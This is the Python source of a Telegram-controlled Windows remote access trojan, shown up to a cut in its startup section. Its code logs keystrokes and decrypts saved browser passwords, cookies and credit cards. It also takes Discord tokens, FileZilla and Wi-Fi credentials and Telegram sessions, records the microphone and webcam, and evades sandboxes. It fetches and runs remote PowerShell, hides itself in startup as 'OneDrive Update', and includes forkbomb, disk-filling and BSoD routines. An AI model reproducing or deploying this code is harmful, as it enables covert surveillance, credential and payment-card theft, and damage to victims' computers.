###############################################################################
####################################ALL IMPORTS ###############################
import os
import ctypes
import random
import win32gui
import sys
import shutil
import subprocess
import urllib.request
import ctypes.wintypes
import json
import datetime
import platform
import re
import os
import win32api
import win32con
from ctypes import wintypes
import base64
from base64 import b64decode
from datetime import datetime
from string import ascii_lowercase
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
from xml.dom import minidom
import time
from threading import Thread
import telebot
try:
	from Crypto.Cipher import AES
except ImportError:
	raise SystemExit('Please run › pip install pycryptodome')


try:
	from threading import Thread
	from pynput.keyboard import Key, Listener
except ImportError:
	raise SystemExit('Please run › pip install pynput')

try:
	import wave
	import pyaudio
except ImportError:
	raise SystemExit('Please run › pip install pyaudio')

try:
	import mss
except ImportError:
	raise SystemExit('Please run › pip install mss')

try:
	from pyperclip import copy, paste
except ImportError:
	raise SystemExit('Please run › pip install pyperclip')


##############################################################################

##############################################################################
################################VARIABLES#####################################
# Token/ID
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'


# Run the script as administrator
AdminRightsRequired = False

# Disable Task Manager at first start
DisableTaskManager = False
# Disable Registry Editor at first start
DisableRegistryTools = False

# Process protection from termination and deletion
ProcessBSODProtectionEnabled = False


# Add to startup at first start
AutorunEnabled = True
# Installation directory
InstallPath = 'C:\\ProgramData\\RegistryEditor'
# Task name in Task Scheduler
AutorunName = 'OneDrive Update'
# The name of the process in the Task Manager
ProcessName = 'System.exe'


# Display a message at first start
DisplayMessageBox = False
# Your Message (will be displayed at start)
Message = 'Message'


# Directory for saving trojan temporary files
Directory = 'C:\\Windows\\Temp\\TelegramRAT\\'

##############################################################################

##############################################################################
###########################FUNCTIONS AND CLASSES##############################
def Forkbomb():
	while True:
		try:
			os.startfile('cmd.exe')
		except:
			pass

def Zipbomb():
	while True:
		try:
			Random = str(random.random())
			open(os.getcwd() + '\\' + Random, 'a').write(Random)
		except:
			pass

def KillProcess(Process):
	if not Process.endswith('.exe'):
		Process = Process + '.exe'
	subprocess.call('taskkill /f /im ' + Process, shell=True)


# Gets the title of the active window

def WindowTitle():
	return win32gui.GetWindowText(win32gui.GetForegroundWindow())


# Stops all processes

def TaskkillAll(CurrentName):
	subprocess.call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
		shell=True)
	subprocess.call('explorer.exe',
		shell=True)

def ProcessList():
	Calling = subprocess.Popen('tasklist',
		shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.readlines()
	Process = [Calling[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(Calling))]
	Processes = '\n'.join(Process)
	return Processes

def SendMessageBox(Message):
	ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)

def OpenBrowser(URL):
	if not URL.startswith('http'):
		URL = 'http://' + URL
	subprocess.call('start ' + URL, shell=True)

def SetWallpapers(Photo, Directory):
	ctypes.windll.user32.SystemParametersInfoW(20, 0, Directory + Photo.file_path, 0)


def Microphone(File, Seconds):
	CHUNK = 1024
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	RECORD_SECONDS = float(Seconds)
	WAVE_OUTPUT_FILENAME = File
	p = pyaudio.PyAudio()
	stream = p.open(format=FORMAT,
					channels=CHANNELS,
					rate=RATE,
					input=True,
					frames_per_buffer=CHUNK)
	frames = []
	for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
		data = stream.read(CHUNK)
		frames.append(data)
	stream.stop_stream()
	stream.close()
	p.terminate()
	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	wf.setnchannels(CHANNELS)
	wf.setsampwidth(p.get_sample_size(FORMAT))
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()


def Hibernate():
	subprocess.call('shutdown -h /f', shell=True)

# Turns off the computer

def Shutdown():
	subprocess.call('shutdown -s /t 0 /f', shell=True)


# Restarts computer

def Restart():
	subprocess.call('shutdown -r /t 0 /f', shell=True)

# Ends user session

def Logoff():
	subprocess.call('shutdown -l /f', shell=True)


# Blue screen of death

def BSoD():
	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))



def Screenshot(File):
	with mss.mss() as sct:
		sct.shot(output=File)

CommandCamPath =  os.path.join(os.getenv('Temp'), 'CommandCam.exe')
CommandCamLink = 'https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe'


# Create screenshot from webcam

def WebcamScreenshot(File, Delay=2500, Camera=1):
	if not os.path.exists(CommandCamPath):
		urllib.request.urlretrieve(CommandCamLink, CommandCamPath)

	Command = f'@{CommandCamPath} /filename \"{File}\" /delay {Delay} /devnum {Camera} > NUL'
	subprocess.call(Command, shell=True)


def Windows():
	System = platform.system()
	Release = platform.release()
	Version = System + ' ' + Release
	return Version


# System Information

def Computer(Win32, Value):
	a = subprocess.check_output('wmic ' + Win32 + ' get ' + Value,
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	b = a.decode('utf-8')
	c = b.split('\n')
	return c[1]


# Computer RAM

def RAM():
	Size = Computer('ComputerSystem', 'TotalPhysicalMemory')
	intSize = int(Size) / 1024 / 1024 / 1024
	return intSize


# Getting the set computer time

def SystemTime():
	Today = datetime.datetime.today()
	SystemTime = str(Today.hour) + ':'+str(Today.minute) + ':' + str(Today.second)
	return SystemTime


# Getting location via IP Address

def Geolocation(Value, Ip=''):
	try:
		Result = urllib.request.urlopen(f'http://ip-api.com/json/{Ip}').read().decode('utf-8')
	except:
		return None
	else:
		Result = json.loads(Result)
		return Result[Value]


# MAC address regex

macRegex = re.compile('[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$')


# Get router ip address

Command = 'chcp 65001 && ipconfig | findstr /i \"Default Gateway\"'

subprocess.check_output(Command,
	shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


# Get mac by local ip

def GetMacByIP():
	a = subprocess.check_output('arp -a',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	b = a.decode(encoding='cp866')
	c = b.find('')
	d = b[c:].split(' ')
	for b in d:
		if macRegex.match(b):
			return b.replace('-', ':')


# Locate by BSSID

def GetLocationByBSSID(BSSID):
	try:
		Result = urllib.request.urlopen(f'http://api.mylnikov.org/geolocation/wifi?bssid={BSSID}').read().decode('utf8')
	except:
		return None
	else:
		Result = json.loads(Result)
		return Result['data']


def SetClipboard(Text):
	copy(Text)


# Get text from clipboard

def GetClipboard():
	return paste()

Count = 0
Keys = []
WindowsTitle = ''


# Detected Button Definition

def Keyboard(Key):
	global Count, Keys

	Keys.append(Key)
	Count += 1

	if Count >= 1:
		WriteFile(Keys)
		Keys = [] 
		Count = 0


# Writing pressed buttons to a file

def WriteFile(Key):
	with open(os.getenv('Temp') + '\\Keylogs.txt', 'a', encoding='utf-8') as f:
		global WindowsTitle
		if WindowsTitle != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
			f.write(('\n\n' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'))
		if str(Key).find('space') >= 0:
			f.write(' ') 
		elif str(Key).find('Key') == -1:
			Key = str(Key[0]).replace("'", '')
		try:
			f.write(Key)
		except:
			pass

		WindowsTitle = win32gui.GetWindowText(win32gui.GetForegroundWindow())


# Listener function

def Threader():
	while True:
		try:
			with Listener(on_press=Keyboard) as listener:
				listener.join()
		except:
			pass


# Activates the keylogger thread

Thread(target=Threader).start()

def VolumeControl(Level):
	for i in range(int(Level)):
		win32api.keybd_event(win32con.VK_VOLUME_UP, 0)


def Admin():
	return ctypes.windll.shell32.IsUserAnAdmin() != 0

Antiviruses = {
	'C:\\Program Files\\Windows Defender': 'Windows Defender',
	'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
	'C:\\Program Files\\AVG\\Antivirus': 'AVG',
	'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
	'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
	'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
	'C:\\Program Files\\DrWeb': 'Dr.Web',
	'C:\\Program Files\\ESET\\ESET Security': 'ESET',
	'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
	'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security'
	}


Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]


def Processlist():
	Processes = []
	Process = subprocess.check_output('@chcp 65001 1> nul && @tasklist /fi \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding='utf-8', errors='strict')
	for ProcessName in Process.split(' '):
		if '.exe' in ProcessName:
			proc = ProcessName.replace('K\r\n', '').replace('\r\n', '')
			Processes.append(proc)
	return Processes


# Detect blacklisted processes

def BlacklistedProcesses():
	Blacklist = (
	'processhacker.exe', 'procexp64.exe',
		'taskmgr.exe', 'perfmon.exe',
	)
	for Process in Processlist():
		if Process.lower() in Blacklist:
			return True

	return False

def MessageBox(Message):
	ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x10)


OrganizationsPaths = (
	'C:\\Users\\' + os.getlogin() + '\\Desktop\\Financial_Report.xls',
	'C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk',
	'C:\\Users\\Administrator\\Desktop\\Callaghan_1966.rtf',
	'C:\\Users\\admin\\Desktop\\my school calendar.xlsx',
	'C:\\Users\\raustin\\Desktop\\zaqrnsnoefaa.xlsx',
	'C:\\Users\\Administrator\\Desktop\\decoy.cpp',
	'C:\\Users\\John\\Desktop\\foobar.txt',
	'C:\\Bank-statement-08-2013.docx',
	'C:\\Users\\STRAZNICA.GRUBUTT',
	'C:\\Users\\Jason\\Desktop',
	'C:\\Users\\Lisa\\Desktop',
	'C:\\TEMP\\Sample.exe',
	'C:\\Users\\Joe Cage'
	)


# Detect Antivirus organization by Directories

def Organization():
	return any([os.path.exists(Organization) for Organization in OrganizationsPaths])


# Checks if the script is running  computer of the anti-virus organization

if Organization() is True:
	sys.exit()


class DATA_BLOB(ctypes.Structure):
	_fields_ = [
		('cbData', wintypes.DWORD),
		('pbData', ctypes.POINTER(ctypes.c_char))
	]


# Get data

def GetData(blob_out):
	cbData = int(blob_out.cbData)
	pbData = blob_out.pbData
	buffer = ctypes.c_buffer(cbData)
	ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
	ctypes.windll.kernel32.LocalFree(pbData)
	return buffer.raw


# Decrypt bytes using DPAPI

def CryptUnprotectData(encrypted_bytes, entropy=b''):
	buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
	buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
	blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
	blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
	blob_out = DATA_BLOB()

	if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None,
		None, 0x01, ctypes.byref(blob_out)):
		return GetData(blob_out)


# Appdata path

LocalAppData = os.environ['LocalAppData'] + '\\'
AppData = os.environ['AppData'] + '\\'
FileName = 116444736000000000
NanoSeconds = 10000000


# Change encoding to UTF8

subprocess.Popen('@chcp 65001 1>nul', shell=True)


# Get browsers install path

def GetBrowsers():
	Browsers = []

	for Browser in BrowsersPath:
		if os.path.exists(Browser):
			Browsers.append(Browser)

	return Browsers


# Decrypt payload

def DecryptPayload(cipher, payload):
	return cipher.decrypt(payload)


# Generate cipher

def GenerateCipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)


# Receive master-key

def GetMasterKey(browserPath):
	fail = True

	for i in range(4):
		path = browserPath + '\\..' * i + '\\Local State'

		if os.path.exists(path):
			fail = False
			break

	if fail:
		return None

	with open(path, 'r', encoding='utf-8') as f:
		local_state = f.read()
		local_state = json_loads(local_state)

	master_key = b64decode(local_state['os_crypt']['encrypted_key'])
	master_key = master_key[5:]
	master_key = CryptUnprotectData(master_key)
	return master_key


# Decrypt value

def DecryptValue(buff, master_key=None):
	starts = buff.decode(encoding='utf-8', errors='ignore')[:3]

	if starts == 'v10' or starts == 'v11':
		iv = buff[3:15]
		payload = buff[15:]
		cipher = GenerateCipher(master_key, iv)
		decrypted_pass = DecryptPayload(cipher, payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	else:
		decrypted_pass = CryptUnprotectData(buff)
		return decrypted_pass


# Get data from database

def FetchDataBase(target_db, sql=''):
	if not os.path.exists(target_db):
		return []

	tmpDB = os.getenv('TEMP') + 'info_' + ''.join(random.choice(ascii_lowercase) for i in range(random.randint(10, 20))) + '.db'
	shutil.copy2(target_db, tmpDB)
	conn = sql_connect(tmpDB)
	cursor = conn.cursor()
	cursor.execute(sql)
	data = cursor.fetchall()
	cursor.close()
	conn.close()

	try:
		os.remove(tmpDB)
	except:
		pass

	return data


# Convert ms time stamp to date

def ConvertDate(ft):
	utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
	return utc.strftime('%Y-%m-%d %H:%M:%S')


# Browsers path's

BrowsersPath = (
	LocalAppData + 'Google\\Chrome\\User Data\\Default',
	AppData + 'Opera Software\\Opera Stable'
)


# Fetch creditcards from chromium based browsers

def GetCreditCards():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Web Data', 'SELECT * FROM credit_cards')

		for row in database:
			if not row[4]:
				break

			card = {
				'number': DecryptValue(row[4], master_key),
				'expireYear': row[3],
				'expireMonth': row[2],
				'name': row[1],
			}
			credentials.append(card)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedCreditCards():
	getCreditCards = GetCreditCards()
	fmtCreditCards = ''
	for card in getCreditCards:
		fmtCreditCards += ('Number: {4}\nName: {1}\nExpireYear: {3}\nExpireMonth: {2}\n\n'
		.format(card['number'], card['expireYear'], card['expireMonth'], card['name']))

	return fmtCreditCards


# Fetch creditcards from chromium based browsers

def GetBookmarks():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		bookmarksFile = browser + '\\Bookmarks'

		if not os.path.exists(bookmarksFile):
			continue
		else:
			with open(bookmarksFile, 'r', encoding='utf-8', errors='ignore') as file:
				bookmarks = load(file)['roots']['bookmark_bar']['children']

		for row in bookmarks:
			bookmark = {
				'hostname': row['url'],
				'name': row['name'],
				'date_added': ConvertDate(row['date_added'])
			}

			credentials.append(bookmark)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedBookmarks():
	getBookmarks = GetBookmarks()
	fmtBookmarks = ''

	for bookmark in getBookmarks:
		fmtBookmarks += ('URL: {0}\nName: {1}\nDate: {2}\n\n'
		.format(bookmark['hostname'], bookmark['name'], bookmark['date_added']))

	return fmtBookmarks


# Fetch passwords from chromium based browsers

def GetPasswords():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Login Data', 'SELECT action_url, username_value, password_value FROM logins')

		for row in database:
			password = {
				'hostname': row[0],
				'username': row[1],
				'password': DecryptValue(row[2], master_key)
			}
			credentials.append(password)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedPasswords():
	getPasswords = GetPasswords()
	fmtPasswords = ''

	for password in getPasswords:
		fmtPasswords += ('Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n'
		.format(password['hostname'], password['username'], password['password']))

	return fmtPasswords


# Fetch cookies from chromium based browsers

def GetCookies():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Cookies', 'SELECT * FROM cookies')

		for row in database:
			cookie = {
				'value': DecryptValue(row[12], master_key),
				'hostname': row[1],
				'name': row[2],
				'path': row[4],
				'expires': row[5],
				'secure': bool(row[6])
			}
			credentials.append(cookie)

	return credentials


# Get cookies converted to NetScape format

def GetFormattedCookies():
	getCookies = GetCookies()
	fmtCookies = ''

	for cookie in getCookies:
		fmtCookies += ('Value: {0}\nHost: {1}\nName: {2}\nPath: {3}\nExpire: {4}\nSecure: {5}\n\n'
		.format(cookie['value'], cookie['hostname'], cookie['name'], cookie['path'],  cookie['expires'], cookie['secure']))

	return fmtCookies


# Fetch history from chromium based browsers

def GetHistory():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		database = FetchDataBase(browser + '\\History', 'SELECT * FROM urls')

		for row in database:
			history = {
				'hostname': row[1],
				'title': row[2],
				'visits': row[3] + 1,
				'expires': ConvertDate(row[5])
			}
			credentials.append(history)

	return credentials


# Get history converted to NetScape format

def GetFormattedHistory():
	getHistory = GetHistory()
	fmtHistory = ''

	for history in getHistory:
		fmtHistory += ('Hostname: {0}\nTitle: {1}\nVisits: {2}\nExpires: {3}\n\n'
		.format(history['hostname'], history['title'], history['visits'], history['expires']))

	return fmtHistory



Roaming = os.getenv('AppData')

Directories = {
	'Discord': Roaming + '\\Discord',
	'Discord Canary': Roaming + '\\discordcanary',
	'Discord PTB': Roaming + '\\discordptb',
}


# Get discord token directory

def Scan(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens


# Grab Discord token files

def DiscordToken():
	for Discord, Directory in Directories.items():
		if os.path.exists(Directory):
			Tokens = Scan(Directory)

		if len(Tokens) > 0:
			for Token in Tokens:
				return Token



# Fetch servers from FileZilla

FileZilla = os.getenv('AppData') + '\\FileZilla\\'

def StealFileZilla():
	if not os.path.exists(FileZilla):
		return []

	RecentServersPath = FileZilla + 'recentservers.xml'
	SiteManagerPath = FileZilla + 'sitemanager.xml'

	# Read recent servers

	if os.path.exists(RecentServersPath):
		xmlDoc = minidom.parse(RecentServersPath)
		Servers = xmlDoc.getElementsByTagName('Server')
		for Node in Servers:
			Server = {
				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
			}

	# Read sitemanager

	if os.path.exists(SiteManagerPath):
		xmlDoc = minidom.parse(SiteManagerPath)
		Servers = xmlDoc.getElementsByTagName('Server')
		for Node in Servers:
			Server = {
				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
			}

	return Server


def StealWifiPasswords():
	Result = []
	Chcp = 'chcp 65001 && '
	Networks = subprocess.check_output(f'{Chcp}netsh wlan show profile',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	Networks = Networks.decode(encoding='utf-8', errors='strict')
	NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks) 
	for NetworkName in NetworkNamesList:
		CurrentResult = subprocess.check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear',
			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')        
		SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace("\"", '')
		Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Cipher = re.findall('(?:Cipher\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		SecurityKey = re.findall(r'(?:Security key\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Password = re.findall('(?:Key Content\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		WiFi = {
			'SSID': SSID,
			'AUTH': Authentication,
			'Cipher': Cipher,
			'SecurityKey': SecurityKey,
			'Password': Password
		}

	return WiFi

import zipfile


Files = [
	'D877F783D5D3EF8Cs',
	'D877F783D5D3EF8C\\maps'
	]


# Get telegram tdata directory

def Scan():
	tdata = os.path.join(os.getenv('AppData'), 'Telegram Desktop\\tdata')
	return tdata


# Grab telegram session files

def TelegramSession(Directory, TelegramDir=Scan()):
	if not os.path.exists(TelegramDir):
		return None

	with zipfile.ZipFile(Directory + 'tdata.zip', 'w', zipfile.ZIP_DEFLATED) as Archive:
		os.chdir(TelegramDir)

		for File in Files:
			if os.path.exists(File):
				Archive.write(File, os.path.join('tdata', File))
##############################################################################

#########################################################################################
##########################################CLASSES########################################
class ADDONS:
    VOICE = "https://raw.githubusercontent.com/samratashok/nishang/master/Misc/Speak.ps1"
    ADVANCED_INFO = "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1"
    #PORT_SCAN = "https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1"
    #DOWNLOAD_WEB = "https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Download.ps1"
    #WIFI = "'https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1'"
    PATH = "ADDONS"

    def check(self):
        if not os.path.exists(self.PATH):
            os.mkdir(self.PATH)
            command = "attrib +h "+'"'+self.PATH+'"'
            self.run(command)
        return "created path"


    def run(self,command):
        comm = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, errors = comm.communicate()
        return output + errors

    def voice(self,command):
        self.check()
        try:
            path = os.path.join(self.PATH,"Speak.ps1")
            if not os.path.exists(path):
                print("LOADING VOICE MODULE FROM NET")
                urllib.request.urlretrieve(self.VOICE, path)
                print("LOADING COMPLETED")
            COMMAND = 'PowerShell -ExecutionPolicy Bypass -Command "& {. ./addons/Speak.ps1; Speak \''+command+"'}"+'"'
            result = self.run(COMMAND)
            if (result) == "1\n":
                return f"[*]succesfully spoke '{command}'"
            else:
                return f"ERROR IN POWERSHELL {result}"
        except Exception as e:
            return f"Unable to speak {command} [" + str(e)+ "]"  
    
    def info(self):
        self.check()
        try:
            path = os.path.join(self.PATH,"Get-Information.ps1")
            if not os.path.exists(path):
                print("LOADING VOICE MODULE FROM NET")
                urllib.request.urlretrieve(self.ADVANCED_INFO, path)
                print("LOADING COMPLETED")
            COMMAND = 'PowerShell -ExecutionPolicy Bypass -Command "& {. ./addons/Get-Information.ps1; Get-Information}"'
            result = self.run(COMMAND)
            return result
        except Exception as e:
            return f"Unable to fetch info [" + str(e)+ "]" 


class Autorun:

	REMOVE_SCRIPT = r"""del /q C:\Users\"%USERNAME%"\AppData\Roaming\KILVISH
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer  /f
cls
echo "[*] DONE "
echo "[*] Please Restart Your System!"
pause
"""

	def run(self,command):
		comm = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
		output, errors = comm.communicate()
		return output + errors

	def become_persistent_on_windows(self,evil_folder_location,evil_file_name):
		if sys.argv[0].endswith(".py"):
			print("can't create executable of python file")
		else:
			evil_file_location = evil_folder_location+ "\\"+evil_file_name
			if not os.path.exists(evil_folder_location):
				os.mkdir(evil_folder_location)
			command = "attrib +h "+'"'+evil_folder_location+'"'
			self.run(command)
			if not os.path.exists(evil_file_location):
				shutil.copyfile(sys.executable, evil_file_location)
				command = "attrib +h "+'"'+evil_file_location+'"'
				self.run(command)
				subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
				return f"Added to startup in {evil_folder_location+'\\'+evil_file_name}"
			else:
				return "Already in Startup"

	
	def uninstall(self):
		
		f = open("remove.bat",'w')
		f.write(self.REMOVE_SCRIPT)
		f.close()
		os.startfile("remove.bat")
		return "removed from autorun"

###############################################################################################################

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = telebot.util.ThreadPool(num_threads=50)

menu = telebot.types.ReplyKeyboardMarkup()
button1 = telebot.types.KeyboardButton('/1\n<<')
button2 = telebot.types.KeyboardButton('/2\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Webcam\n📸')
button5 = telebot.types.KeyboardButton('/Audio\n🎙')
button6 = telebot.types.KeyboardButton('/Power\n🔴')
button7 = telebot.types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5)
menu.row(button6, button7)

main2 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Hibernate - 🛑', callback_data='hibernate')
button2 = telebot.types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
button3 = telebot.types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
button5 = telebot.types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
button6 = telebot.types.InlineKeyboardButton('« Back', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Add to Startup - 📥', callback_data='startup')
button2 = telebot.types.InlineKeyboardButton('Uninstall - ♻️', callback_data='confirm')
button3 = telebot.types.InlineKeyboardButton('« Back', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Yes, im sure!', callback_data='uninstall')
button2 = telebot.types.InlineKeyboardButton('Hell no!', callback_data='cancel')
button3 = telebot.types.InlineKeyboardButton('« Back', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = telebot.types.ReplyKeyboardMarkup()
button1 = telebot.types.KeyboardButton('/3\n<<')
button2 = telebot.types.KeyboardButton('/4\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Files\n💾')
button5 = telebot.types.KeyboardButton('/Tasklist\n📋')
button6 = telebot.types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button3, button2)
main5.row(button4)
main5.row(button5, button6)

main6 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Kill all Processes', callback_data='taskkill all')
button2 = telebot.types.InlineKeyboardButton('Disable Task Manager', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = telebot.types.ReplyKeyboardMarkup()
button1 = telebot.types.KeyboardButton('/CD\n🗂')
button2 = telebot.types.KeyboardButton('/Upload\n📡')
button3 = telebot.types.KeyboardButton('/ls\n📄')
button4 = telebot.types.KeyboardButton('/Remove\n🗑')
button5 = telebot.types.KeyboardButton('/Download\n📨')
button6 = telebot.types.KeyboardButton('/Run\n📌')
button7 = telebot.types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = telebot.types.ReplyKeyboardMarkup()
button1 = telebot.types.KeyboardButton('/5\n<<')
button2 = telebot.types.KeyboardButton('/6\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Message\n💬')
button5 = telebot.types.KeyboardButton('/Speak\n📢')
button6 = telebot.types.KeyboardButton('/OpenURL\n🌐')
button7 = telebot.types.KeyboardButton('/Wallpapers\n🧩')
main8.row(button1, button3, button2)
main8.row(button4, button5)
main8.row(button6, button7)


# Create a folder to save temporary files

CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]

RAT = [
	Directory,
	Directory + 'Documents',
	Directory + 'Photos'
	]

for Directories in RAT:

	if not os.path.exists(Directories):
		os.makedirs(Directories)


# Run as Administrator

# if AdminRightsRequired is True:

# 	if Admin() is False:
# 		while True:
# 			try:
# 				print('[~] › Trying elevate previleges to administrator\n')
# 				os.startfile(CurrentPath, 'runas')
# 			except:
# 				pass
# 			else:
# 				print('[+] › ' + CurrentName + ' opened as admin rights\n')
# 				sys.exit()


# Disables TaskManager

# if DisableTaskManager is True:

# 	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
# 		print('[+] › taskmgr.exe is already disabled\n')

# 	else:
# 		if Admin() is False:
# 			print('[-] › This function requires admin rights\n')

# 		if Admin() is True:
# 			RegeditDisableTaskManager()
# 			open(Directory + 'RegeditDisableTaskManager', 'a').close()
# 			print('[+] › taskmgr.exe has been disabled\n')


# Disables Regedit

# if DisableRegistryTools is True:

# 	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
# 		print('[+] › regedit.exe is already disabled\n')

# 	else:
# 		if Admin() is False:
# 			print('[-] › This function requires admin rights\n')

# 		if Admin() is True:
# 			RegeditDisableRegistryTools()
# 			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
# 			print('[+] › regedit.exe has been disabled\n')


# Adds a program to startup

if AutorunEnabled is True:
	try:
		autorun = Autorun()
		ans = autorun.become_persistent_on_windows(InstallPath,AutorunName)
		print('[+] > ' + ans+ "\n")
	except:
